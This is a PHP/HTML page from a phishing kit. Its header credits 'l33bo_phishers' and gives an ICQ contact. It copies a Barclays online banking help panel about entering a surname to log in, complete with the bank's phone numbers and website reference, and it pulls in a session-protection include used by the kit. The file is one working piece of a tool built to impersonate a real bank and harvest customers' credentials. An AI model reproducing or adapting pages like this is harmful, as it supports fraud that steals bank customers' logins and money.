<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "../includes/session_protect.php";
?>
﻿<!DOCTYPE html>
<html lang="en-GB">
<head>
<link rel="stylesheet" type="text/css" href="css/001.css" media="screen" />
<script type="text/javascript" src="js/001.js"></script>
<script type="text/javascript" src="js/002.js"></script>
<script type="text/javascript" src="js/003.js"></script>
</head>
<body class='personal ContextualHelp'>
<div class="header">
<div class="">
</div>
<div class="separator">
<hr />
</div>
</div>
<div class="page">
<div class="body">
<div class="content">
<div class="section">
<div id='box1' class='mod cont-sm borderless'>
<div class="rt">
<div class="lt">
<div class="m-cont">
<p>Type your surname (family name) as it&nbsp;appears on your most recent statement.</p>
<p>If your surname has changed, go to your local branch with proof of the change (eg, your marriage certificate) to get your details amended. You should then call us on 0345 600 2323* (outside the UK dial +44 2476 842063) so that we can change your log-in details.</p>
<p>*Lines are open Monday to Sunday, 7am to 11pm. For call charges information, visit barclays.co.uk/callcharges. To maintain a quality service, calls may be monitored or recorded.</p></div>
</div>
</div>
<div class="rb"></div>
</div>
</div>
</div>
<div class="main-footer"></div>
</div>
</body>
</html>
